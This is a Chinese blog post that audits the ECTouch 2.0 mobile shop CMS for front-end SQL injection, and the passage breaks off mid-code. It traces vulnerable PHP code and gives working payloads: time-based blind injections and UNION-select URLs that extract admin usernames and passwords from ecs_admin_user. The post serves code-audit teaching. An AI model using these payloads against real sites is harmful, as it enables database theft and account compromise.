> 原文链接: https://www.anquanke.com//post/id/169152 


# Etouch2.0 分析代码审计流程 (二) 前台SQL注入


                                阅读量   
                                **230488**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/dm/1024_459_/t013c0ecb907d637952.jpg)](https://p2.ssl.qhimg.com/dm/1024_459_/t013c0ecb907d637952.jpg)



## 0x1 前言

​拜读了phpoop师傅的审计文章,心情激动w分,急急忙忙写完手头作业,为了弥补上篇的遗憾,趁热继续认真重读了前台代码(之前没认真读需要登陆的控制器),然后幸运的在各个地方找到了几个还算满意的前台注入。阅读此文,强烈建议,食用开篇作[Ectouch2.0 分析解读代码审计流程](https://www.anquanke.com/post/id/168991),风味更佳。



## 0x2 介绍下ECTOUCH的相关配置

​ 更多内容可以参考上篇文章[Ectouch2.0 分析解读代码审计流程](https://www.anquanke.com/post/id/168991),这里主要针对SQL谈谈。

```
1. 程序安装默认关闭debug模式,这样子程序不会输出mysql错误

   `/upload/mobile/include/base/drivers/db/EcMysql.class.php`

   ```php
   //输出错误信息
   public function error($message = '', $error = '', $errorno = '') `{`
       if (DEBUG) `{` //false
           
           $str = " `{`$message`}`&lt;br&gt;
                   &lt;b&gt;SQL&lt;/b&gt;: `{`$this-&gt;sql`}`&lt;br&gt;
                   &lt;b&gt;错误详情&lt;/b&gt;: `{`$error`}`&lt;br&gt;
                   &lt;b&gt;错误代码&lt;/b&gt;:`{`$errorno`}`&lt;br&gt;";
       `}` else `{`
           $str = "&lt;b&gt;出错&lt;/b&gt;: $message&lt;br&gt;";
       `}`
       throw new Exception($str);
   `}`
   ```

   所以一般考虑盲注,有回显的注入,要不然过于鸡肋了。
```



## 0x3 谈谈自己审计这个cms的误区

当时我看前台的时候很容易就可以发现limit后面的注入,因为我之前一直认为limit后面只能使用报错注入,然后就没怎么研究直接跳过了,导致第一次没审计出前台注入,后来我找了下资料,发现自己错了,limit后面也可以进行盲注,不过参考下网上文章这种方法只是适用**5.6.6的5.x系列**, 为了严谨一点,我本地测试了下,发现的确不行,但是没有去深入了解底层原理,如果有师傅愿意谈谈,实在是我的荣幸,所以说limit后注入是有mysql的版本限制的,所以这里我只分享一个limit后的注入,其他点抛砖引玉。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws2.sinaimg.cn/large/006tNc79gy1fytb7lclcjj31kc09e0ux.jpg)

参考文章:[技术分享：Mysql注入点在limit关键字后面的利用方法 ](https://www.freebuf.com/articles/web/57528.html)

> **分享写tips:**
1.可能有些跟我一样的菜鸟还是不理解要去哪里找注入,这里谈谈我的看法。
首先注入需要交互,也就是需要输入,所以要找个接收参数的点,这个时候直接去看控制器无疑是很好的选择,因为这里是功能点,需要用户来交互,当然不排除有其他的地方,ex。



## 0x5 前台 Flow consignee_list limit限制SQL注入

`upload/mobile/include/apps/default/controllers/FlowController.class.php`

```
*/
    public function consignee_list() `{`
        if (IS_AJAX) `{`
            $start = $_POST ['last']; //可控
            $limit = $_POST ['amount']; //可控
            // 获得用户所有的收货人信息
            $consignee_list = model('Users')-&gt;get_consignee_list($_SESSION['user_id'], 0, $limit, $start);//这里传入
            ......................
            die(json_encode($sayList));
            exit();
```

可控参数如入了`Users`model类里面,跟进函数:

`pload/mobile/include/apps/default/models/UsersModel.class.php`

```
function get_consignee_list($user_id, $id = 0, $num = 10, $start = 0) `{`
        if ($id) `{`
            $where['user_id'] = $user_id;
            $where['address_id'] = $id;
            $this-&gt;table = 'user_address';
            return $this-&gt;find($where);
        `}` else `{`
            $sql = 'select ua.*,u.address_id as adds_id from ' . $this-&gt;pre . 'user_address as ua left join '. $this-&gt;pre . 'users as u on ua.address_id =u.address_id'. ' where ua.user_id = ' . $user_id . ' order by ua.address_id limit ' . $start . ', ' . $num; //很明显没有单引号,直接拼接进去造成了注入。

            return $this-&gt;query($sql);
        `}`
    `}`
```

然后回头看下调用需要满足的条件:

`if (IS_AJAX) `{``

下面介绍下寻找定义的技巧,(ps我以前第一次审计的时候看这东西很懵b,因为没有弄过开发,木有经验。)

`IS_AJAX` 这种很明显就是宏定义,直接搜索`define('IS_AJAX'`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/006tNc79gy1fytbw98ccdj30vq08240b.jpg)

```
public function __construct() `{`
        $this-&gt;model = model('Base')-&gt;model;
        $this-&gt;cloud = Cloud::getInstance();
        // 定义当前请求的系统常量
        define('NOW_TIME', $_SERVER ['REQUEST_TIME']);
        define('REQUEST_METHOD', $_SERVER ['REQUEST_METHOD']);
        define('IS_GET', REQUEST_METHOD == 'GET' ? true : false );
        define('IS_POST', REQUEST_METHOD == 'POST' ? true : false );
        define('IS_PUT', REQUEST_METHOD == 'PUT' ? true : false );
        define('IS_DELETE', REQUEST_METHOD == 'DELETE' ? true : false );
        define('IS_AJAX', (isset($_SERVER ['HTTP_X_REQUESTED_WITH']) &amp;&amp; strtolower($_SERVER ['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest')); 
        load_file(ROOT_PATH . 'data/certificate/appkey.php');
    `}`
```

控制器基类的构造函数里面定义了：`define('IS_AJAX',);`

所以利用方式就很简单了,两个可控参数都进去sql了,随便取一个

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws2.sinaimg.cn/large/006tNc79gy1fytc6pzoqjj31160eegpd.jpg)

跟进下执行知道:

`$sql=select ua.*,u.address_id as adds_id from ecs_user_address as ua left join ecs_users as u on ua.address_id =u.address_id where ua.user_id = 0 order by ua.address_id limit 1,`

然后直接进入查询

`return $this-&gt;query($sql);`

所以可以构造payload:

```
last=1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)#
```

关于其他limit点,在介绍一些我的**skills**:

通过搜索正则 `limit ' .(.*)$num`、`limit.`:

`Searching 48 files for "limit ' .(.*)$num" (regex)`

[![](https://p4.ssl.qhimg.com/dm/1024_905_/t01f9e11c954bbdfe55.jpg)](https://p4.ssl.qhimg.com/dm/1024_905_/t01f9e11c954bbdfe55.jpg)

这些重复的点再分析就很没有意思了,但是limit后注入这个系统很多,你们可以跟着文章去学习找找有趣的点。



## 0x6 前台 Flow done $order [‘shipping_id’]半无限制SQL注入

​ 这个点不像前面那种那么明显可以看出来,这可能就考验我们的耐心去读代码了,这里谈谈我的**skills**

> ​ **直接正则匹配出sql的语句一条条的读,然后回溯排除。**

​ 下面开始回到漏洞分析上:

`FlowController.class.php`

```
if (isset($is_real_good)) `{`
            $res = $this-&gt;model-&gt;table('shipping')-&gt;field('shipping_id')-&gt;where("shipping_id=" . $order ['shipping_id'] . " AND enabled =1")-&gt;getOne();
            if (!$res) `{`
                show_message(L('flow_no_shipping'));
            `}`
        `}`
```

这里可以看到以字符串形式变量拼接到了where方法里面(字符串拼接及其容易导致SQL注入)

那么我们可以直接回溯前文看下`$order`是否可控:

lines 1094

```
$order = array(
            'shipping_id' =&gt; I('post.shipping'),//这里可控
            ......................
        );
```

然后我们看下需要满足什么条件才能执行到漏洞点处:

简单例子分析下:

```
public function done() `{`
        /* 取得购物类型 */
        $flow_type = isset($_SESSION ['flow_type']) ? intval($_SESSION ['flow_type']) : CART_GENERAL_GOODS;
        /* 检查购物车中是否有商品 */
        $condition = " session_id = '" . SESS_ID . "' " . "AND parent_id = 0 AND is_gift = 0 AND rec_type = '$flow_type'";
        $count = $this-&gt;model-&gt;table('cart')-&gt;field('COUNT(*)')-&gt;where($condition)-&gt;getOne();
        if ($count == 0) `{`
            show_message(L('no_goods_in_cart'), '', '', 'warning'); //处理下这里
        `}`
        /* 如果使用库存，且下订单时减库存，则减少库存 */
        if (C('use_storage') == '1' &amp;&amp; C('stock_dec_time') == SDT_PLACE) `{`
            $cart_goods_stock = model('Order')-&gt;get_cart_goods();
            $_cart_goods_stock = array();
            foreach ($cart_goods_stock ['goods_list'] as $value) `{`
                $_cart_goods_stock [$value ['rec_id']] = $value ['goods_number'];
            `}`
            model('Flow')-&gt;flow_cart_stock($_cart_goods_stock);
            unset($cart_goods_stock, $_cart_goods_stock);
        `}`
        // 检查用户是否已经登录 如果用户已经登录了则检查是否有默认的收货地址 如果没有登录则跳转到登录和注册页面
        if (empty($_SESSION ['direct_shopping']) &amp;&amp; $_SESSION ['user_id'] == 0) `{`
            /* 用户没有登录且没有选定匿名购物，转向到登录页面 */
            ecs_header("Location: " . url('user/login') . "n"); //这里要处理
        `}`
```

主要是处理下

这些跳转停止代码执行的语句

`ecs_header("Location: " . url('user/login') . "n");`

需要用户登陆

`if (empty($_SESSION ['direct_shopping']) &amp;&amp; $_SESSION ['user_id'] == 0) `{``

后面一些判断条件依次满足就行了,这些都很简单,读读代码,就行了。

你也可以看我怎么利用然后返回去分析代码:

`http://127.0.0.1:8888/ecshop/upload/mobile/?m=default&amp;c=flow&amp;a=done`

直接访问提示购物车没有商品,那就随便注册个用户然后选个实物商品进去购物车

然后`http://127.0.0.1:8888/ecshop/upload/mobile/?m=default&amp;c=flow&amp;a=done`

提示填收货地址那么自己填写收货地址

这个时候就满足条件了：

`post:shipping=1 and sleep(5)%23`

[![](https://p2.ssl.qhimg.com/dm/1024_81_/t01256cd36f2baf52aa.jpg)](https://p2.ssl.qhimg.com/dm/1024_81_/t01256cd36f2baf52aa.jpg)

其实这个点还是很有意思的,当时我在想能不能搞个回显注入

```
if (isset($is_real_good)) `{`
            $res = $this-&gt;model-&gt;table('shipping')-&gt;field('shipping_id')-&gt;where("shipping_id=" . $order ['shipping_id'] . " AND enabled =1")-&gt;getOne();
            if (!$res) `{` //这里返回了$res
                show_message(L('flow_no_shipping'));
            `}`
        `}`
```

通过debug跟进到sql执行流程可以得到执行的语句是:

`$sql=SELECT shipping_id FROM ecs_shipping  WHERE shipping_id=1 and sleep(1)%23 AND enabled =1 LIMIT 1`

一列,构造下payload:

`post:shipping=-1 union select user_name from ecs_admin_user%23`

那么得到的`$res` 就是管理员的用户名了,后面我跟了下(文件内搜索$res) 没有发现有输出

按照代码逻辑命名来讲,这个返回值相当于布尔判断吧,应该是没有输出的,仅仅起到判断的作用,所以这个前台漏洞只能布尔盲注了,这也是我说这个漏洞叫半限制SQL注入的原因。



## 0x7 前台 Category index 多个参数半限制SQL注入

​ 这个点有点遗憾,但是却引起了我的诸多思考。

​ 接下来的分析就不再花大笔墨去讲基础操作,代码分析,希望你能仔细阅读我前面的分析,然后自己去读代码。

`upload/mobile/include/apps/default/controllers/CategoryController.class.php`

```
public function index()
    `{`
        $this-&gt;parameter(); //跟进这里
```

```
private function parameter()
    `{`
        // 如果分类ID为0，则返回总分类页
        if (empty($this-&gt;cat_id)) `{`
            $this-&gt;cat_id = 0;
        `}`
        // 获得分类的相关信息
        $cat = model('Category')-&gt;get_cat_info($this-&gt;cat_id);
        $this-&gt;keywords();
        $this-&gt;assign('show_asynclist', C('show_asynclist'));
        // 初始化分页信息
        $page_size = C('page_size');
        $brand = I('request.brand', 0, 'intval');
        $price_max = I('request.price_max'); //这里外部获取可控变量
        $price_min = I('request.price_min'); //这里外部获取可控变量
        $filter_attr = I('request.filter_attr');
        $this-&gt;size = intval($page_size) &gt; 0 ? intval($page_size) : 10;
        $this-&gt;page = I('request.page') &gt; 0 ? intval(I('request.page')) : 1;
        $this-&gt;type = I('request.type');
        $this-&gt;brand = $brand &gt; 0 ? $brand : 0;
        $this-&gt;price_max = $price_max &gt; 0 ? $price_max : 0; //利用php弱类型绕过
        $this-&gt;price_min = $price_min &gt; 0 ? $price_min : 0;
```

这里 `$price_max = I('request.price_max');`-&gt;`$this-&gt;price_max = $price_max &gt; 0 ? $price_max : 0; //利用php弱类型绕过`

这个绕过很经典呀 `1.0union select == 1` 也就是说

`$this-&gt;price_max` 、`$this-&gt;price_min`变量可以被控制

继续跟进代码,发现:

Lines 75

```
$count = model('Category')-&gt;category_get_count($this-&gt;children, $this-&gt;brand, $this-&gt;type, $this-&gt;price_min, $this-&gt;price_max, $this-&gt;ext, $this-&gt;keywords);//可控变量
        $goodslist = $this-&gt;category_get_goods();
        $this-&gt;assign('goods_list', $goodslist);
        .....................
        $this-&gt;assign('pager', $this-&gt;pageShow($count));//注册返回结果到模版
```

当时我很开心啊,终于来个无限制回显的SQL注入,结果分析下去无果,但是我感觉很有意思。

我们继续跟进model类:

```
function category_get_count($children, $brand, $type, $min, $max, $ext, $keyword)
    `{`

        $where = "g.is_on_sale = 1 AND g.is_alone_sale = 1 AND " . "g.is_delete = 0 ";
        if ($keyword != '') `{`
            $where .= " AND (( 1 " . $keyword . " ) ) ";
        `}` else `{`
            $where .= " AND ($children OR " . model('Goods')-&gt;get_extension_goods($children) . ') ';
        `}`
        ..............
        if ($brand &gt; 0) `{`
            $where .= "AND g.brand_id = $brand ";//
        `}`
        if ($min &gt; 0) `{`
            $where .= " AND g.shop_price &gt;= $min "; //直接拼接变量
        `}`
        if ($max &gt; 0) `{` //这里可控
            $where .= " AND g.shop_price &lt;= $max"; //直接拼接变量
        `}`


        $sql = 'SELECT COUNT(*) as count FROM ' . $this-&gt;pre . 'goods AS g ' . ' LEFT JOIN ' . $this-&gt;pre . 'touch_goods AS xl ' . ' ON g.goods_id=xl.goods_id ' . ' LEFT JOIN ' . $this-&gt;pre . 'member_price AS mp ' . "ON mp.goods_id = g.goods_id AND mp.user_rank = '$_SESSION[user_rank]' " . "WHERE $where $ext "; //直接拼接变量
        $res = $this-&gt;row($sql);//进入查询
        return $res['count'];
    `}`
```

`"WHERE $where $ext ";` 从这里可以看到100%注入了,那么构造下回显注入罗:

debug出SQL语句,本地MYSQL执行:

```
SELECT COUNT(*) as count FROM ecs_goods AS g  LEFT JOIN ecs_touch_goods AS xl  ON g.goods_id=xl.goods_id  LEFT JOIN ecs_member_price AS mp ON mp.goods_id = g.goods_id AND mp.user_rank = '0' WHERE g.is_on_sale = 1 AND g.is_alone_sale = 1 AND g.is_delete = 0  AND (g.cat_id  IN ('0')  OR g.goods_id IN ('') )  AND g.shop_price &lt;= 1
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws3.sinaimg.cn/large/006tNc79gy1fytfy8eb3wj30vk0b0jst.jpg)

count的话总是会有返回值的,之前那个控制id=-1可以令结果集为空,然后联合注入,这个却不行,

骚操作,但是我们可以这样来绕过:

`AND g.shop_price &lt;= 1.0union select password from ecs_admin_user;`

[![](https://p4.ssl.qhimg.com/dm/1024_350_/t01da9d5abe68303624.jpg)](https://p4.ssl.qhimg.com/dm/1024_350_/t01da9d5abe68303624.jpg)

然后怎么让他升到第一列,利用`order by` //这种情况只适合两列或者有最大值的情况。

`AND g.shop_price &lt;= 1.0union select password from ecs_admin_user order by count desc limit 1;`

这样就可以返回管理员的密码了,哈哈我很开心呀,结果发现,页面没有返回,直接跳转到mysql错误那里去了,

经过分析在下面一行代码又重复调用了那个变量。

输入payload:

`http://127.0.0.1:8888/ecshop/upload/mobile/?m=default&amp;c=Category&amp;a=index&amp;price_max=1.0union select password from ecs_admin_user order by count desc limit 1%23`

跟进下程序执行:

`$count = model('Category')-&gt;category_get_count($this-&gt;children, $this-&gt;brand, $this-&gt;type, $this-&gt;price_min, $this-&gt;price_max, $this-&gt;ext, $this-&gt;keywords);`

执行完这个语句后可以看到:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws4.sinaimg.cn/large/006tNc79gy1fytg7rladvj30o803s74r.jpg)

是正常的,继续走,下一句发现程序mysql错误,停止执行,那么跟进看下原因

```
private function category_get_goods()
    `{`
    ................................
        `}`
        if ($this-&gt;brand &gt; 0) `{`
            $where .= "AND g.brand_id=$this-&gt;brand ";
        `}`
        if ($this-&gt;price_min &gt; 0) `{`
            $where .= " AND g.shop_price &gt;= $this-&gt;price_min ";
        `}`
        if ($this-&gt;price_max &gt; 0) `{`
            $where .= " AND g.shop_price &lt;= $this-&gt;price_max "; //再次拼接这个变量
        `}`

        $sql = 'SELECT g.goods_id, g.goods_name, g.goods_name_style, g.market_price, g.is_new, g.is_best, g.is_hot, g.shop_price AS org_price, g.last_update,' . "IFNULL(mp.user_price, g.shop_price * '$_SESSION[discount]') AS shop_price, g.promote_price, g.goods_type, g.goods_number, " .
            'g.promote_start_date, g.promote_end_date, g.goods_brief, g.goods_thumb , g.goods_img, xl.sales_volume ' . 'FROM ' . $this-&gt;model-&gt;pre . 'goods AS g ' . ' LEFT JOIN ' . $this-&gt;model-&gt;pre . 'touch_goods AS xl ' . ' ON g.goods_id=xl.goods_id ' . ' LEFT JOIN ' . $this-&gt;model-&gt;pre . 'member_price AS mp ' . "ON mp.goods_id = g.goods_id AND mp.user_rank = '$_SESSION[user_rank]' " . "WHERE $where $this-&gt;ext ORDER BY $sort $this-&gt;order LIMIT $start , $this-&gt;size";
        $res = $this-&gt;model-&gt;query($sql);
```

这里可以看出来`WHERE $where $this-&gt;ext` 这里又拼接进去查询了,然而这里有11列,那么查询肯定报错(前面是1列),这里我对比了下两个函数的代码,发现他们没有任何差别,所以这里很遗憾没办法进行绕过。

> 但是这里我衍生下攻击思路:
比如第二个函数里面有第二个参数可控的话,并且在前面,而第一个函数没有的话,那么我们控制第二个函数的那个参数,去注释掉我们第一个函数的第一个参数,不让mysql出错,这样就可以达到回显注入了。

这个点可以说是我感觉比较好玩的点了。

**总结来说下:**

这个点依然是半限制的盲注,时间盲注是通杀的,但是可以考虑布尔盲注,自己寻找下差异构造就行了。



## 0x8 前台FLOW cart_label_count $goods_id 半限制SQL注入

```
public function cart_label_count()`{`
    $goods_id  = I('goods_id',''); //没有intval处理
    $parent_id  = I('parent_id',''); 
    if($parent_id )`{`
        $shop_price = $this-&gt;model-&gt;table('goods')-&gt;where(array('goods_id'=&gt;$parent_id))-&gt;field('shop_price')-&gt;getOne();
    `}`
    if($goods_id) `{`
        $sql = "select g.shop_price ,gg.goods_price from " . $this-&gt;model-&gt;pre ."group_goods as gg LEFT JOIN " . $this-&gt;model-&gt;pre . "goods as g on gg.goods_id = g.goods_id " . "where gg.goods_id in ($goods_id) and gg.parent_id = $parent_id "; //拼接
        $count = $this-&gt;model-&gt;query($sql);
    `}`
    $num=0;
    if(count($count)&gt;0)`{`
        foreach($count as $key)`{`
            $count_price += floatval($key['goods_price']);
            $num ++;
        `}`
    `}`else`{`
        $count_price = '0.00';
    `}`
    if($shop_price)`{`
        $count_price += floatval($shop_price);
        $num += 1;
    `}`
    $result['content'] = price_format($count_price);
    $result['cart_number'] = $num;
    die(json_encode($result));
```

`where gg.goods_id in ($goods_id)` 这里直接拼接了进去导致了注入

```
if(count($count)&gt;0)`{`
        foreach($count as $key)`{`
            $count_price += floatval($key['goods_price']);
            $num ++;
        `}`
    `}`else`{`
        $count_price = '0.00';
    `}`
```

这里做了个强制转换,导致不能把结果带出来,可以考虑布尔盲注



## 0x9 前台 User $rec_id 多处注入

### <a class="reference-link" name="0x9.1%20del_attention()%20%E5%8D%8A%E9%99%90%E5%88%B6SQL%E6%B3%A8%E5%85%A5"></a>0x9.1 del_attention() 半限制SQL注入

```
public function del_attention() `{`
        $rec_id = I('get.rec_id', 0); //直接获取
        if ($rec_id) `{`
            $this-&gt;model-&gt;table('collect_goods')-&gt;data('is_attention = 0')-&gt;where('rec_id = ' . $rec_id . ' and user_id = ' . $this-&gt;user_id)-&gt;update();
        `}`
        $this-&gt;redirect(url('collection_list'));
    `}`
```

### <a class="reference-link" name="0x9.2%20add_attention()%20%E5%8D%8A%E9%99%90%E5%88%B6SQL%E6%B3%A8%E5%85%A5"></a>0x9.2 add_attention() 半限制SQL注入

```
public function add_attention() `{`
    $rec_id = I('get.rec_id', 0); //直接获取
    if ($rec_id) `{`
        $this-&gt;model-&gt;table('collect_goods')-&gt;data('is_attention = 1')-&gt;where('rec_id = ' . $rec_id . ' and user_id = ' . $this-&gt;user_id)-&gt;update();
    `}`
    $this-&gt;redirect(url('collection_list'));
`}`
```

### <a class="reference-link" name="0x9.3%20aftermarket_done%20%E6%97%A0%E9%99%90%E5%88%B6SQL%E6%B3%A8%E5%85%A5"></a>0x9.3 aftermarket_done 无限制SQL注入

```
public function aftermarket_done() `{`
        /* 判断是否重复提交申请退换货 */
        $rec_id = empty($_REQUEST['rec_id']) ? '' : $_REQUEST['rec_id']; //控制输入
     ....................................
        if ($rec_id) `{`
            $num = $this-&gt;model-&gt;table('order_return')
                    -&gt;field('COUNT(*)')
                    -&gt;where(array('rec_id' =&gt; $rec_id))
                    -&gt;getOne();
        `}` else `{`
            show_message(L('aftermarket_apply_error'), '', '', 'info', true);
        `}`
        $goods = model('Order')-&gt;order_goods_info($rec_id); /* 订单商品 */ //这里也是注入
        $claim = $this-&gt;model-&gt;table('service_type')-&gt;field('service_name,service_type')-&gt;where('service_id = ' . intval(I('post.service_id')))-&gt;find(); /* 查询服务类型 */
        $reason = $this-&gt;model-&gt;table('return_cause')-&gt;field('cause_name')-&gt;where('cause_id = ' . intval(I('post.reason')))-&gt;find(); /* 退换货原因 */
        $order = model('Users')-&gt;get_order_detail($order_id, $this-&gt;user_id); /* 订单详情 */
        if (($num &gt; 0)) `{`
            /* 已经添加 查询服务订单 */
            $order_return = $this-&gt;model-&gt;table('order_return')
                    -&gt;field('ret_id, rec_id, add_time, service_sn, return_status, should_return,is_check,service_id')
                    -&gt;where('rec_id = ' . $rec_id) //拼接变量
                    -&gt;find(); //where注入
            $ret_id = $order_return['ret_id'];
        `}` else `{`
```

`$goods = model('Order')-&gt;order_goods_info($rec_id); /* 订单商品 */ //这里也是注入`

```
$order_return = $this-&gt;model-&gt;table('order_return')
                    -&gt;field('ret_id, rec_id, add_time, service_sn, return_status, should_return,is_check,service_id')
                    -&gt;where('rec_id = ' . $rec_id) //拼接变量
                    -&gt;find(); //where注入
            $ret_id = $order_return['ret_id'];
```

这个注入需要条件比较多,自己跟下代码就好了。

你们可以继续分析下:

`public function check_aftermarket($rec_id)` //OrderModel.class.php:

`function order_goods_info($rec_id)`//OrderModel.class.php

`function aftermarket_goods($rec_id)` //OrderModel.class.php

`function get_cert_img($rec_id)`//OrderModel.class.php

`public function check_aftermarket($rec_id)`//UsersModel.class.php

里面都是直接拼接,可以全局搜索下调用地方,如果没有intval那么就是注入点了,我当时看了下没什么发现



## 0x10 (0day?)前台多处无条件无限制完美SQL注入

```
这个无限制注入的挖掘过程,还是耐心吧,找调用,找返回。
```

### <a class="reference-link" name="0x10.1%20Exchange%20asynclist_list%20%24integral_max%20%24integral_min%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5"></a>0x10.1 Exchange asynclist_list $integral_max $integral_min无限制注入

直接看payload:

`http://127.0.0.1:8888/ecshop/upload/mobile/index.php?c=Exchange&amp;a=asynclist_list&amp;integral_max=1.0union select 1,password,3,password,5,user_name,7,8,9,10,11 from ecs_admin_user order by goods_id asc%23`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/006tNc79gy1fythqk8shlj32co0f8jwk.jpg)

分析一波:

`upload/mobile/include/apps/default/controllers/ExchangeController.class.php`

```
public function asynclist_list() `{`
        $this-&gt;parameter();//跟进这里
        $asyn_last = intval(I('post.last')) + 1;
        $this-&gt;page = I('post.page');
        $list = model('Exchange')-&gt;exchange_get_goods($this-&gt;children, $this-&gt;integral_min, $this-&gt;integral_max, $this-&gt;ext, $this-&gt;size,
        $this-&gt;page, $this-&gt;sort, $this-&gt;order);
        die(json_encode(array('list' =&gt; $list))); //这个die好东西,直接输出结果了
        exit();
    `}`
```

这里需要跟进二个函数:

1.`$this-&gt;parameter();` 作用获取:

`$this-&gt;children, $this-&gt;integral_min, $this-&gt;integral_max`

2.`model('Exchange')-&gt;exchange_get_goods` 作用拼接造成sql

分析1

```
private function parameter() `{`
        // 如果分类ID为0，则返回总分类页
        $page_size = C('page_size');
        $this-&gt;size = intval($page_size) &gt; 0 ? intval($page_size) : 10;
        $this-&gt;page = I('request.page') ? intval(I('request.page')) : 1;
        $this-&gt;ext = '';
        $this-&gt;cat_id = I('request.cat_id');
        $this-&gt;integral_max = I('request.integral_max');//获取
        $this-&gt;integral_min = I('request.integral_min');//
```

分析2

```
function exchange_get_goods($children, $min, $max, $ext, $size, $page, $sort, $order) `{`
        $display = $GLOBALS['display'];
        $where = "eg.is_exchange = 1 AND g.is_delete = 0 AND " .
                "($children OR " . model('Goods')-&gt;get_extension_goods($children) . ')';

        if ($min &gt; 0) `{`
            $where .= " AND eg.exchange_integral &gt;= $min ";
        `}`

        if ($max &gt; 0) `{`
            $where .= " AND eg.exchange_integral &lt;= $max ";//直接拼接导致注入
        `}`

        /* 获得商品列表 */
        $start = ($page - 1) * $size;
        $sort = $sort == 'sales_volume' ? 'xl.sales_volume' : $sort;
        $sql = 'SELECT g.goods_id, g.goods_name, g.market_price, g.goods_name_style,g.click_count, eg.exchange_integral, ' .
                'g.goods_type, g.goods_brief, g.goods_thumb , g.goods_img, eg.is_hot ' .
                'FROM ' . $this-&gt;pre . 'exchange_goods AS eg LEFT JOIN  ' . $this-&gt;pre . 'goods AS g ' .
                'ON  eg.goods_id = g.goods_id ' . ' LEFT JOIN ' . $this-&gt;pre . 'touch_goods AS xl ' . ' ON g.goods_id=xl.goods_id ' .
                " WHERE $where $ext ORDER BY $sort $order LIMIT $start ,$size ";//拼接
        $res = $this-&gt;query($sql);
```

关于利用怎么返回注入内容参考我前面说的,payload用了order by排序来绕过,你们可以参考本文去debug,

因为写到这里,我觉得不再必要去细细再讲一次,你们动手debug可能会更好。

```
public function asynclist()
    `{`
        $this-&gt;parameter();
        $this-&gt;assign('show_marketprice', C('show_marketprice'));
        $asyn_last = intval(I('post.last')) + 1;
        $this-&gt;size = I('post.amount');
        $this-&gt;page = ($asyn_last &gt; 0) ? ceil($asyn_last / $this-&gt;size) : 1;
        $goodslist = $this-&gt;category_get_goods();
        foreach ($goodslist as $key =&gt; $goods) `{`
            $this-&gt;assign('goods', $goods);
            $sayList[] = array(
                'single_item' =&gt; ECTouch::view()-&gt;fetch('library/asynclist_info.lbi')
            );
        `}`
        die(json_encode($sayList));
        exit();
    `}`

    /**
     * 异步加载商品列表
     */
    public function async_list()
    `{`
        $this-&gt;parameter();
        $this-&gt;assign('show_marketprice', C('show_marketprice'));
        $this-&gt;page = I('post.page');
        $goodslist = $this-&gt;category_get_goods();
        die(json_encode(array('list' =&gt; $goodslist)));
        exit();
    `}`
```

### <a class="reference-link" name="0x10.2%20category%20asynclist%20price_max%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5"></a>0x10.2 category asynclist price_max无限制注入

Payload:`http://127.0.0.1:8888/ecshop/upload/mobile/index.php?c=category&amp;a=asynclist&amp;price_max=1.0union select 1,user_name,3,4,5,password,7,8,9,10,11,12,13,14,15,16,17,18,19 from ecs_admin_user order by goods_id asc limit 1%23`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws3.sinaimg.cn/large/006tNc79gy1fytj7ojjr0j322u0i442g.jpg)

```
public function asynclist()
    `{`
        $this-&gt;parameter();
        $this-&gt;assign('show_marketprice', C('show_marketprice'));
        $asyn_last = intval(I('post.last')) + 1;
        $this-&gt;size = I('post.amount');
        $this-&gt;page = ($asyn_last &gt; 0) ? ceil($asyn_last / $this-&gt;size) : 1;
        $goodslist = $this-&gt;category_get_goods(); //注入
        foreach ($goodslist as $key =&gt; $goods) `{`
            $this-&gt;assign('goods', $goods);
            $sayList[] = array(
